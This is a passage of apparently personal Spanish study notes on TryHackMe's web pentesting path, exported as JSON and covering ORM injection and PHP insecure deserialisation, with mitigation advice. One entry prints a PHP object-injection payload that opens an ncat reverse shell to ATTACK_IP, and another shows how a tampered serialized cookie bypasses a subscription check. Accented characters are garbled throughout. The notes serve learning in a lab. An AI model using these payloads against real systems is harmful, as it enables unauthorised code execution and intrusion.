robusto para aplicaciones Java. Simplifica el mapeo de clases Java a tablas de bases de datos y ofrece una capabilidad de recuperaci√≥n y manipulaci√≥n de informaci√≥n a trav√©s de Hibernate Query Language (HQL). \n<h4>SQLAlchemy (Python)</h4>\nSQLAlchemy es un framework ORM vers√°til y poderoso para Python. Ofrece un toolkit SQL y un sistema ORM que permite a los desarrolladores usar SQL crudo cuando se necesite sin perder las ventajas de un ORM.\n<h4>Entity Framework (C#)</h4>\nEs un framework ORM de Microsoft para aplicaciones .NET. Permite a los desarrolladores trabajar con informaci√≥n relacional usando objetos de dominio espec√≠ficos, eliminando la necesidad de la mayor√≠a de c√≥digo de acceso que los desarrolladores t√≠picamente suelen tener que escribir.\n<h4>Active Record (Ruby on Rails)</h4>\nEs el framework ORM por defecto para aplicaciones Ruby on Rails. Sigue el patr√≥n de dise√±o Active Record, lo que signidica que cada tabla en la base de datoos corresponde a una clase y cada fila en la tabla corresponde a una clase y cada fila a una instancia de dicha clase.",
    "modified": "2026-01-16T00:55:48"
  },
  {
    "title": "4. Identifying ORM Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/6-orm-injection/4-identifying-orm-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/6. ORM Injection/4. Identifying ORM Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 6. ORM Injection",
    "content": "Identificar vulnerabilidades ORM involucra examinar c√≥mo el input del usuario se maneja en las queries. Estas vulnerabilidades surgen cuando el input del usuario se incrusta directamente en los m√©todos query ORM sin sanitizar o validar.\n\n--------------------------------------\n<h2>T√©cnicas de Comprobaci√≥n de Inyecci√≥n ORM</h2>\n- **Revisi√≥n de C√≥digo Manual:** Una inspecci√≥n a conciencia del c√≥digo fuente puede revelar m√©todos de query raw como `whereRaw()` que incorporan el input directamente. Busca strings concatenadas o inputs no escapados.\n- **Escaneo Automatizado:** Usa herramientas de escaneo de seguridad dise√±adas para detectar vulnerabilidades ORMi.\n- **Comprobaci√≥n de Validaci√≥n de Input:** Realiza comprobaciones manuales inyectando payloads en los inputs de la aplicaci√≥n.\n- **Comprobaci√≥n Basada en Errores:** Introduce informaci√≥n incorrecta o malformada adrede para disparar errores, que pueden revelar detalles de la estructura subyacente.\n\n<h4>Frameworks y Comprobaci√≥n de Inyecci√≥n ORM</h4>\n\n| **Framework  <br>** | **Librer√≠a ORM** | **M√©todos Com√∫nmente Vulnerables**   |\n| ------------------- | ---------------- | ------------------------------------ |\n| Laravel             | Eloquent ORM     | `whereRaw(), DB::raw()`              |\n| Ruby on Rails       | Active Record    | `where(\"name = '#{input}'\")`         |\n| Django              | Django ORM       | `extra()`, `raw()`                   |\n| Spring              | Hibernate        | `createQuery()` with `concatenation` |\n| Node.js             | Sequelize        | `sequelize.query()`                  |\n\nLa tabla de arriba subraya varios frameworks de desarrollo web y su librer√≠a ORM asociada, detallando m√©todos comunes que son tendentes a vulnerabilidades. Por ejemplo, en Laravel, usando `whereRaw()` o `DB::raw()` con el input del usuario puede llevar a inyecci√≥n ORM, pero puede prevenirse usando queries parametrizadas con el m√©todo `where()`. En Django, de forma similar, m√©todos como `extra()` y `raw()` pueden introducir vulnerabilidades si no se manejan correctamente.\n\n---------------------------------------------\n<h2>Explorando la Aplicaci√≥n Objetivo</h2>\nAhora que sabemos c√≥mo identificar vulnerabilidades de inyecci√≥n ORM, visitemos el sitio `https://IP.reverse-proxy.cell-prod-us-east-1b.vm.tryhackme.com/`. Aqu√≠ veremos que el sitio web te pide un input. Para determinar qu√© framework se usa, podemos emplear varias t√©cnicas como inspeccionar cookies, ver el c√≥digo fuente o analizar headers HTTP.\n<h4>T√©cnicas para Identificar el Framework</h4>\n- **Verificar Cookies:** Examina las cookies configuradas por la aplicaci√≥n. Los frameworks suelen usar convenciones de nombramiento √∫nicas.\n  ![[Pasted image 20260116114511.png]]\n- **Revisar C√≥digo Fuente:** Mira en el c√≥digo fuente HTML en busca de comentarios, etiquetas meta o cualquier script incrustado que pueda revelar firmas espec√≠ficas de framework.\n  ![[Pasted image 20260116114608.png]]\n- **Analizar headers HTTP:** Los headers HTTP pueden contener a veces informaci√≥n sobre el servidor y el framework.\n- **Estructura URL:** La estructura de las URLs puede dar pistas sobre el framework.\n- **P√°ginas de Login y Error:** Las p√°ginas de error y autentificaci√≥n pueden revelar a veces el framework.\n\nAhora que hemos identificado que la aplicaci√≥n usa Laravel inspeccionando cookies y c√≥digo fuente, podemos ir m√°s all√° poniendo input malicioso para explorar su comportamiento. Espec√≠ficamente, introduciremos `1'` para ver c√≥mo maneja ese input. Lo introducimos en el campo email (vulnerable) y la mandamos.\n\n![[Pasted image 20260116120810.png]]\n\nDespu√©s de subirla tenemos que observar de cerca el comportamiento de la aplicaci√≥n. Si la aplicaci√≥n devuelve un mensaje de error como `SQLSTATE[42000]: Syntax error or access violation` indica que el input ha sido manejado incorrectamente porque lo ha concatenado, resultando en error de sintaxis. El output muestra que usa Laravel's Eloquent ORM ya que los mensajes de error y patrones query son caracter√≠sticos de ello.",
    "modified": "2026-01-17T00:53:14"
  },
  {
    "title": "0. ORM Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/6-orm-injection/0-orm-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/6. ORM Injection/0. ORM Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks > 6. ORM Injection",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/6. ORM Injection/1. Introduction]]\n[[2. Understanding ORM]]\n[[3. How ORM Works]]\n[[4. Identifying ORM Injection]]\n[[5. ORM Injection - Weak Implementation]]\n[[6. ORM Injection - Vulnerable Implementation]]\n[[7. Best Practices]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Exploitation - Object Injection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/6-exploitation-object-injection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/6. Exploitation - Object Injection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "La inyecci√≥n de objetos es una vulnerabilidad que surge de la deserializaci√≥n de informaci√≥n insegura en las aplicaciones web. Ocurre cuando datos no confiables se deserializan en un objeto, permitiendo a los atacantes manipular la informaci√≥n serializada para ejecutar c√≥digo arbitrario.\n\nPara explotar una vulnerabilidad de inyecci√≥n de objetos PHP, la aplicaci√≥n deber√≠a incluir una clase con un m√©todo m√°gico de PHP. como `__wakeup` o `__sleep` que pueden ser explotados. Todas las clases involucradas en el ataque deber√≠an ser declaradas antes de llamar al m√©todo `serialize()` ( a no ser que el object autoloading est√© habilitado).\n\n<h4>Ejemplo</h4>\nConsideremos un trozo de c√≥digo `index.php` que muestra la serializaci√≥n y deserializaci√≥n usando el `serialize()` y `unserialize()`. El c√≥digo acepta el par√°metro GET decode o encode y convierte el input del usuario en concordancia.\n\n```php\n<?php\nclass UserData {\n    private $data;\n    public function __construct($data) {\n        $this->data = $data;\n    }\n..\nrequire 'test.php';\nif(isset($_GET['encode'])) {\n    $userData = new UserData($_GET['encode']);\n    $serializedData = serialize($userData);\n    $base64EncodedData = base64_encode($serializedData);\n    echo \"Normal Data: \" . $_GET['encode'] . \"<br>\";\n    echo \"Serialized Data: \" . $serializedData . \"<br>\";\n    echo \"Base64 Encoded Data: \" . $base64EncodedData;\n\n} elseif(isset($_GET['decode'])) {\n    $base64EncodedData = $_GET['decode'];\n    $serializedData = base64_decode($base64EncodedData);\n    $test = unserialize($serializedData);\n    echo \"Base64 Encoded Serialized Data: \" . $base64EncodedData . \"<br>\";\n    echo \"Serialized Data: \" . $serializedData;\n\n...\n```\n\nPor ejemplo, si mandamos el input **hellothm** v√≠a la URL `http://IP/case2/?encode=hellothm`, obtendremos el siguiente output:\n\n![[Pasted image 20260120152934.png]]\n\nVemos que el c√≥digo incluye un archivo llamado `test.php`. Desde una revisi√≥n de c√≥digo, considerando si el framework es opensource, el pentester sabe que `test.php` contiene una clase llamada `MaliciousUserData` como se muestra:\n\n```php\n<?php\nclass MaliciousUserData {\npublic $command = 'ncat -nv ATTACK_IP 10.10.10.1 -e /bin/sh'; // call to troubleshooting server\n    \n    public function __wakeup() { \n    exec($this->command);\n...\n\n?>\n```\n\nEn el c√≥digo de arriba, aunque hay deserializaci√≥n insegura, es posible manipular las propiedades de un objeto, incluyendo alterar la propiedad `command` de la clase `MaliciousUserData` en el c√≥digo de arriba. Esto puede conseguirse construyendo una string serializada espec√≠fica que contenga los valores de propiedades deseados. Por ejemplo, si queremos modificar la propiedad `command` para ejecutar un comando diferente, podemos serializar un objeto con el valor de propiedad deseado e inyectarlo en la funci√≥n vulnerable `unserialize()`. De esta forma al ser deserializado la propiedad modificada ser√° cargada en el objeto.\n\nEs importante entender que durante la deserializai√≥n insegura no puedes actualizar directamente la definici√≥n del m√©todo `__wakeup` en s√≠ mismo. Es parte de la definici√≥n de clase y se mantiene est√°tico durante el proceso de deserializaci√≥n. Sin embargo, puedes modificar el comportamiento o propiedades del objeto en el m√©todo `__wakeup`. Esto significa que mientras que la definici√≥n del m√©todo se mantiene constante, sus acciones al deserializarse pierden ser manipuladas.\n\n-----------------------------------------------------\n<h2>Preparando el Payload</h2>\nComo ya hemos visto, llamar a otra clase es una funcionalidad normal de PHP, y puedes ver el c√≥digo de ese archivo si la p√°gina est√° usando c√≥digo abierto. El c√≥digo en `index.php` deserializa el input sin realizar ninguna sanitizaci√≥n. ¬øQu√© pasa si cambiamos la clase `MaliciousUserData` y modificamos el atributo `command` para que cuando se llame a la funci√≥n `__wakeup` sea llamada con el valor del atacante?\n\nVamos a crear c√≥digo PHP que genere informaci√≥n serializada maliciosa.\n\n```php\n<?php\nclass MaliciousUserData {\npublic $command = 'ncat -nv ATTACK_IP 4444 -e /bin/sh';\n}\n\n$maliciousUserData = new MaliciousUserData();\n$serializedData = serialize($maliciousUserData);\n$base64EncodedData = base64_encode($serializedData);\necho \"Base64 Encoded Serialized Data: \" . $base64EncodedData;\n?>\n```\n\n- En el c√≥digo de arriba, la funci√≥n `_wakeup()` de la clase `MaliciousUserData` (`test.php`) ejecutara una reverse shell usando `ncat` para conectarse a la `ATTACK_IP` por el puerto `4444` con la flag `-e` para ejecutar `/bin/sh` como una shell.\n- Una vez creado el archivo, ejec√∫talo con `php index.php`. Esto devolver√° un objeto serializado en base64 de la clase `MaliciousUserData`.\n- La string encodeada en base 64 generada se vera como: `TzoxNzoiTWFsaWNp[Redacted]`.\n- Empezamos el listener usando `nc -nvlp 4444`.\n- Ahora explotamos la deserializaci√≥n insegura yendo a `http://10.64.169.42/case2/?decode=[SHELLCODE]`.\n- Una vez que visitemos la URL, la string se deserializan  y ejecuta la funci√≥n `__wakeup()`.",
    "modified": "2026-01-21T00:56:33"
  },
  {
    "title": "8. Mitigation Measures",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/8-mitigation-measures/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/8. Mitigation Measures.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "Mitigar los riesgos asociados con la deserializaci√≥n insegura es fundamental para asegurar la seguridad de una aplicaci√≥n web. Implementando medidas de defensa efectivas, las organizaciones pueden reducir significativamente la probabilidad de explotaci√≥n\n\n-----------------------------------\n<h2>Perspectiva de Red Teamer / Pentester</h2>\n- **An√°lisis de C√≥digo Base:** Realiza una revisi√≥n de los mecanismos de serializaci√≥n de la app. Identifica puntos potenciales de deserializaci√≥n y serializaci√≥n.\n- **Identificaci√≥n de Vulnerabilidades:** Usa herramientas de an√°lis est√°tico para detectar vulnerabilidades de deserializaci√≥n insegura.\n- **Fuzzeo y An√°lisis Din√°mico:** Emplea t√©cnicas de fuzzeo para generar informaci√≥n de input err√≥nea o no esperada. Usa herramientas de an√°lisis din√°mico para monitorizar el comportamiento de la aplicaci√≥n en su periodo de ejecuci√≥n.\n- **Evaluaci√≥n de Manejo de Errores:** Eval√∫a c√≥mo la aplicaci√≥n maneja errores durante la deserializaci√≥n. Busca mensajes de errores pontenciales o trazas que revelen detalles del sistema.\n\n-----------------------------------------------------\n<h2>Perspectiva de Programador Seguro</h2>\n- **Evitar Formatos de Serializaci√≥n Inseguros:** Evita usar formatos inseguros de serializaci√≥n como Java serialisation. Elige alternativas m√°s seguras como JSON o XML.\n- **Evitar `eval` y `exec`:** Evita usar las funciones `eval()` y `exec()` ya que pueden ejecutar c√≥digo arbitrario.\n- **Validar el Input y Encodear el Output:** Implementa validaci√≥n estricta de input para asegurar que s√≥lo la informaci√≥n pretendida es aceptada. Aplica t√©cnicas de encoding de output para sanitizar la informaci√≥n antes de la serializaci√≥n.\n- **Pr√°cticas de Programaci√≥n Seguras:** Sigue las pr√°cticas seguras de programaci√≥n recomendadas por los est√°ndares de ciberseguridad. Adopta principios como least privilege, defence in depth y fail-safe defaults.\n- **Adherencia a Gu√≠as:** Gu√≠as de programaci√≥n establecidas para frameworks espec√≠ficos.",
    "modified": "2026-01-23T00:56:08"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "El input proporcionado por el usuario ha sido consistentemente un catalizador para las vulnerabilidades, suponiendo un riesgo persistente para numerosas plataformas y aplicaciones. Otro riesgo no tan entendido pero igualmente peligroso es la deserializaci√≥n insegura.\n\nLos exploits de deserializaci√≥n insegura ocurren cuando una aplicaci√≥n conf√≠a en informaci√≥n serializada lo suficiente para usarla sin validar su autenticidad, lo que puede llevar a resultados desastrosos.Este tipo de vulnerabilidad est√° presente en aplicaciones que serializan y deserializan estructuras complejas de datos a lo largo de varios entornos de programaci√≥n. como Java, .NET y PHP.\n\n--------------------------------------------\n<h2>Objetivos de Aprendizaje</h2>\nA lo largo de esta unidad ganaremos conocimiento en:\n\n- C√≥mo funcionan los procesos de serializaci√≥n y deserializaci√≥n.\n- Riesgos potenciales de aplicaciones web.\n- T√©cnicas de explotaci√≥n.\n- Medidas de mitigaci√≥n.\n\n--------------------------------------------\n<h2>Pre-requisitos</h2>\n- [[Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/0. How Websites Work]]\n- [[0. Protocols and Servers]]\n- [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/0. OWASP Top 10 - 2021]]",
    "modified": "2026-01-19T00:59:19"
  },
  {
    "title": "4. Identification",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/4-identification/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/4. Identification.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "Despu√©s de un entendimiento completo de la serializaci√≥n a lo largo de diferentes lenguajes de programaci√≥n, transicionaremos ahora a un aspecto cr√≠tico de la ciberseguridad, explotando y mitigando vulnerabilidades relacionadas a la serializaci√≥n. Antes de ver las t√©cnicas de explotaci√≥n es necesario aprender a identificar estas vulnerabilidades en las aplicaciones, ya tengamos acceso al c√≥digo o no.\n\n--------------------------------------\n<h2>Acceso al C√≥digo Fuente</h2>\nCuando tenemos acceso al c√≥digo fuente, identificar las vulnerabilidades de serializaci√≥n puede ser m√°s directo, pero requiere un buen entendimiento de d√≥nde y qu√© buscar. Por ejemplo en busca de funciones como `serialize()`, `unserialize()` o `pickle.loads()`. Debemos prestar especial atenci√≥n a cualquier punto donde el input del usuario sea pasado directamente a estas funciones.\n\n---------------------------------------------\n<h2>Sin Acceso al C√≥digo Fuente</h2>\nAl auditar una aplicaci√≥n sin acceso al c√≥digo fuente, el reto recae en deducir c√≥mo se procesa la informaci√≥n basado en observaciones e interacciones externas. Esto es com√∫nmente conocido como **black-box testing**. Una t√©cnica bastante usada para intentar acceder a backups o archivos temporales creados por editores de texto es a√±adir `~` al final de un archivo PHP.\n\n<h4>Analizando Respuestas del Servidor</h4>\n- **Mensajes de error:** Ciertos mensajes de error pueden indicar indirectamente problemas con las serializaci√≥n. Por ejemplo, PHP puede que mande errores o avisos que contengan frases como `unserialize()` u **Object deserialisation error** que revela procesos de serializaci√≥n y puntos de vulnerabilidad potenciales.\n- **Inconsistencias en el comportamiento de la aplicaci√≥n:** Desde comportamiento inesperado en la respuesta hasta input manipulado, pueden sugerir problemas con c√≥mo se deserializa y maneja la informaci√≥n. Observar c√≥mo maneja informaci√≥n serializada alterada la aplicaci√≥n  puede ofrecer pistas sobre c√≥digo potencialmente vulnerable.\n\n<h4>Examinando Cookies</h4>\nLas cookies se suelen usar para guardar informaci√≥n serializada en aplicaciones web. Examinando los contenidos de la cookie podemos soler inferir:\n\n- **Valores base64 encodeados en cookies (PHP y .NET):** Si las cookies contienen informaci√≥n que se ve como base64 encoded, decodearla puede revelar objetors o estructuras de datos serializazdos. PHP suele usar serializaci√≥n para manejo de sesiones y guardar variables de sesi√≥n en formato serializado.\n- **View State ASP.NET:** Las aplicaciones .NET puede que usen la serializaci√≥n en el view state mandado al navegador del cliente. Un campo llamado `__VIEWSTATE`, que est√° base64 encodeado, puede verse a veces. Decodearlo y examinarlo puede revelar si contiene datos serializados potencialmente explotables.",
    "modified": "2026-01-21T00:56:33"
  },
  {
    "title": "3. Serialisation Formats",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/3-serialisation-formats/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/3. Serialisation Formats.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "Aunque diferentes lenguajes de programaci√≥n usan diferentes palabras clave y funciones para la serializaci√≥n, el principio subyaciente permanece constante. La serializaci√≥n es el proceso de convertir el estado de un objeto a un formato que pueda ser f√°cilmente almacenado o transmitido y luego reconstru√≠do.\n\nAl contrario que otras vulnerabilidades comunes que explotan el procesamiento inmediato de los inputs del usuario, los problemas de deserializaci√≥n insegura involucran una interacci√≥n m√°s profunda con la l√≥gica principal de la aplicaci√≥n.\n\nExploremos c√≥mo se maneja expl√≠citamente la serializaci√≥n en diferentes lenguaje, junto a su funcionalidad, sintaxis y cualidades particulares.\n\n---------------------------------------\n<h2>Serializaci√≥n PHP</h2>\nEn PHP, la serializaci√≥n se consigue usando la funci√≥n `serialize()`. Esta convierte un objeto o array de PHP a un stream de bytes representando la informaci√≥n y estructura del objeto. El byte stream resultante puede incluir varios tipos de datos, como strings, arrays y objetos. Para ilustrarlo, consideremos una aplicaci√≥n de notas donde los usuarios pueden guardar y recuperar sus notas. Crearemos una clase PHP llamada **Notes** para representar cada nota y manejar la serializaci√≥n y deserializaci√≥n.\n\n```php\nclass Notes {\n    public $Notescontent;\n\n    public function __construct($content) {\n        $this->Notescontent = $content;\n    }\n}\n```\n\nEn nuestra aplicaci√≥n Notes, cuando un usuario guarda una nota, la serializamos usando `serialize()`. Esto convierte el objeto en una representaci√≥n de string que puede ser guardada en un archivo o base de datos. Echemos un vistazo al siguiente trozo de c√≥digo que serializa los objetos de la clase Notes.\n\n```php\n$note = new Notes(\"Welcome to THM\");\n$serialized_note = serialize($note);\n```\n\nEntramos en `http://IP/phptest/` e introducimos cualquier string para serializazr o deserializar. Por ejemplo, si introduces la string **Welcome to THM**, generar√° el output: `O:5:\"Notes\":1:{s:7:\"content\";s:14:\"Welcome to THM\";}`.\n\n![[Pasted image 20260120100215.png]]\n\nVamos a decodear el output:\n\n- `O:5:\"Notes\":1:`: Esta parte indica que la informaci√≥n serializada erpresenta un objeto de la clase Notes,  que tiene una propiedad.\n- `s:7:\"content\"`: Esto representa la propiedad llamada \"**content**\" con una longitud de 7 caracteres. En informaci√≥n serializada, las strings se representan con `s` seguido de la longitud  de la string y la string entre comillas. Los enteros se representan con una `i` seguido del valor num√©rico sin comillas.\n- `s:14:\"Welcome to THM\"`: Este es el valor de la propiedad **content** con una longitud de 14 caracteres.\n\n----------------------------------------\n<h2>M√©todos M√°gicos</h2>\nPHP ofrece varios [m√©todos m√°gicos](https://www.php.net/manual/en/language.oop5.magic.php) que juegan varios roles en el proceso de serializaci√≥n. Algunos de estos m√©todos importantes se mencionan debajo:\n\n- `___sleep()`: Este m√©todo se llama en un objeto antes de la serializaci√≥n. Limpia recursos, como conexiones a bases de datos y se espera que devuelva un array de nombres de propiedades que deber√≠an ser serializadas.\n- `__wakeup()`: Este m√©todo es llamado al deserializar. Puede restablecer cualquier conexi√≥n que el objeto pueda necesitar para operar correctamente.\n- `__serialize()`: En PHP 7.4 este m√©todo permite personalizar la informaci√≥n de serializazci√≥n devolviendo un array representando la forma serializada del objeto.\n- `__unserialize()`: Es la contraparte de `__serialize()` y permite personalizar la restauraci√≥n de un objeto desde su informaci√≥n serializada.\n\n--------------------------------------------------\n<h2>Python</h2>\nPython usa un m√≥dulo llamado **Pickle** para serializar y deserializar objetos. Este m√≥dulo convierte un objeto Python en un byte stram (y viceversa), permitiendo que sea guardado en un archivo o transmitido a trav√©s de la red. Maneja casi todos los tipos de objetos Python sin intervenci√≥n manual. Seguiremos el mismo ejemplo de Notes de PHP con Python con `app.py`:\n\n```python\nimport pickle\nimport base64\n\n...\nserialized_data = request.form['serialized_data']\nnotes_obj = pickle.loads(base64.b64decode(serialized_data))\nmessage = \"Notes successfully unpickled.\"\n...\n\nelif request.method == 'POST':\n    if 'pickle' in request.form:\n        content = request.form['note_content']\n        notes_obj.add_note(content)\n        pickled_content = pickle.dumps(notes_obj)\n        serialized_data = base64.b64encode(pickled_content).decode('utf-8')\n        binary_data = ' '.join(f'{x:02x}' for x in pickled_content)\n        message = \"Notes pickled successfully.\"\n```\n\n<h4>Pickling Process</h4>\n- **Creando la clase Notes:** Esta clase maneja una lista de notas. Ofrece m√©todos para a√±adir una nota y recuperar todas, haciendo f√°cil manejar el estado de la aplicaci√≥n.\n- **Serializaci√≥n (Pickling):** Cuando un usuario sube una nota, la instancia de clase Notes se serializa (todas las notas) usando `pickle.dumps()`. Esta funci√≥n transforma el objeto Python en formato binario que puede reconvertirse m√°s adelante.\n\n<h4>Mostrando la Informaci√≥n Serializada (Base64 Encoding)</h4>\n- **Por qu√© usar base64:** La informaci√≥n serializazda es binaria y no segura de mostrar en todos los entornos. La informaci√≥n binaria puede contener bytes que pueden interferir con protocolos de comunicaci√≥n (como HTTP). Base64 es un esquema de encodeado que convierte informaci√≥n binaria en texto plano. S√≥lo usa caracteres legibles haci√©ndolo seguro de transmitir por canales que no soportan informaci√≥n binaria.\n- **Proceso de Encoding:** Despu√©s de serializar el objeto `Notes`, la informaci√≥n binaria se encodea en base64 usando `base64.b643ncode()`. Esta string es segura de mostrar en HTML y f√°cil de guardar o transmitir.\n\n<h4>Deserializaci√≥n</h4>\n- **Base64 decoding:** Al hacer unpickling, la string base64 se decodea de vuelta a un formato binario usando `base64.b64deconde()`.\n- **Unpickling:** Los datos binarios se pasan a `pickle.loads()` lo que reconstruye el objeto original de Python del binary stream.\n\nDe nuevo, si visitamos el link `http://IP:5000` e introducimos la string **Welcome to THM**:\n\n![[Pasted image 20260120122602.png]]\n\n- **Pickling:** Cuando la string se picklea se convierte en formato binario que no es legible por humanos.\n- **Base64 encoding:** El binario se encodea en Base64.\n\nEn Java la serializaci√≥n de objetos la lleva a cabo `Serializable`. Para .NET, inicialmente fue `BinaryFormatter` y ahora `System.Text.Json` para serializaciones JSON o `System.Xml.Serialization` para tareas XML. Ruby ofrece simplicidad con su m√≥dulo `Marshal`.",
    "modified": "2026-01-21T00:56:33"
  },
  {
    "title": "5. Exploitation - Update Properties",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/5-exploitation-update-properties/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/5. Exploitation - Update Properties.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
    "content": "<h2>Actualizando las Propiedades de un Objeto</h2>\nEn esta tarea exploraremos un ejemplo pr√°ctico en PHP, usando una aplicaci√≥n simple de compartir notas. Nuestra aplicaci√≥n permite a los usuarios crear, guardar y compartir notas f√°cilmente. Los usuarios pueden introducir sus notas en la aplicaci√≥n que son guardadas para referencias futuras. Adem√°s, los usuarios pueden compartir sus notas con otros, facilitando la colaboraci√≥n y el intercambio de informaci√≥n. La aplicaci√≥n tambi√©n incluye funcionalidades basadas en suscripci√≥n, asegurando que s√≥lo los usuarios suscritos tengan acceso a ciertas funcionalidades como compartir las notas. Puedes acceder a la web en `http://IP/case1`.\n\n![[Pasted image 20260120134821.png]]\n\nVamos a ver c√≥mo se ha constru√≠do la aplicaci√≥n.\n\n<h4>Definiendo la Clase Notes</h4>\nLa aplicaci√≥n tiene una clase `Notes`, representando una nota en nuestra aplicaci√≥n. Esta clase tiene tres propiedades privadas: `user`, `role` y `isSubscribed`. Tambi√©n tenemos m√©todos setter y getter para manipular la propiedad `isubscribed`.\n\n```php\nclass Notes {\n\n    private $user;\n    private $role;\n    private $isSubscribed;\n\n    public function __construct($user, $role, $isSubscribed) {\n        $this->user = $user;\n        $this->role = $role;\n        $this->isSubscribed = $isSubscribed;\n    }\n\n    public function setIsSubscribed($isSubscribed) {\n        $this->isSubscribed = $isSubscribed;\n    }\n\n    public function getIsSubscribed() {\n        return $this->isSubscribed;\n }\n}\n```\n\n<h4>Guardando la Informaci√≥n de Usuario en Cookies</h4>\nCuando un usuario visita niuestra aplicaci√≥n web por primera vez, configura una cookie serializada que contiene su informaci√≥n. Esto incluye su nombre de usuario, rol y estado de subscripci√≥n (`isSubscribed`). Si el usuario es un miembro suscripto (**isSubscribed = true**), se les permite compartir notas.\n\n![[Pasted image 20260120150357.png]]\n\n<h4>Explotando la Vulnerabilidad</h4>\nEn este paso ilustraremos c√≥mo un atacante puede explotar la vulnerabilidad modificando la cookie serializada para ganar acceso no autorizado a compartir notas.\n\n- **Serialised cookie:** Despu√©s de decodear el valor base64 encodeado de la cookie, obtenemos la siguiente representaci√≥n serializada del objeto Notes.\n\n```php\nO:5:\"Notes\":3:{s:4:\"user\";s:5:\"guest\";s:4:\"role\";s:5:\"guest\";s:12:\"isSubscribed\";b:0;}\n```\n\n- `O:5:\"Notes\":3`: Esto representa un objeto (O) con la clase Notes, la cual tiene 3 propiedades.\n- `s:4:\"user\";s:5:\"guest\"`: Esto indica una string (s) con una longitud de 4 caracteres representando a la propiedad `user` con el valor \"guest\".\n- `s:4:\"role\";s:5:\"guest\"`: Esto similar al de arriba indica que la propiedad `role` tiene el valor \"guest\".\n- `s:12:\"isSubscribed\";b:0`: Representa un booleano (b) llamado `isSubscribed` con el valor falso (0).\n\n---------------------------------------------\n<h2>Explotando la Vulnerabilidad</h2>\nEl el escenario actual, cuando el usuario intenta compartir una nota, le sale el siguiente pop-up:\n\n![[Pasted image 20260120151116.png]]\n\nY bien, ¬øqu√© est√° pasando en el backend? El c√≥digo PHP del backend valida la cookie entrante, la deserializa, y luego valida si el usuario est√° o no suscrito. Nuestra tarea principal es bypassear eso.\n\nSup√≥n que un atacante intercepta esta cookie serializada y modifica el valor de la propiedad `isSubscribed` de falso (0) a verdadero (1). El atacante puede manipular el estado de suscripci√≥n sin autorizaci√≥n leg√≠tima cambiando el valor booleano en la informaci√≥n serializada.\n\n![[Pasted image 20260120151337.png]]\n\nDespu√©s de modificarlo, el atacante vuelve a base64 encodearlo y listo.",
    "modified": "2026-01-21T00:56:33"
  },
  {
    "title": "7. Automation Scripts",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/1-insecure-deserialisation/7-automation-scripts/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/1. Insecure Deserialisation/7. Automation Scripts.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks > 1. Insecure Deserialisation",
